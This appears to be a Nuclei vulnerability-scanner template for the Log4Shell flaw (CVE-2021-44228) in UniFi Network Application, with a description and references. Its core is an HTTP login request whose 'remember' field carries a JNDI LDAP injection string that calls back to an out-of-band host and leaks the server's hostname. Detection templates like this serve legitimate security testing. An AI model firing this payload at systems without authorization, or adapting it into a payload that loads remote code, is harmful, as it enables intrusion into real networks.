# Nuclei Template: UniFi Network Application - Remote Code Execution (Apache Log4j)
**Template ID:** unifi-network-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`unifi-network-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
UniFi Network Application is susceptible to a critical vulnerability in Apache Log4j (CVE-2021-44228) that may allow for remote code execution in an impacted implementation.

## Steps to reproduce / Exploit Payload
```http
POST /api/login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json; charset=utf-8
Origin: {{RootURL}}
Referer: {{RootURL}}/manage/account/login?redirect=%2Fmanage

{"username":"user","password":"pass","remember":"${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.postdata.{{interactsh-url}}}","strict":true}
```

## References
- https://community.ui.com/releases/UniFi-Network-Application-6-5-55/48c64137-4a4a-41f7-b7e4-3bee505ae16e
- https://twitter.com/sprocket_ed/status/1473301038832701441
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
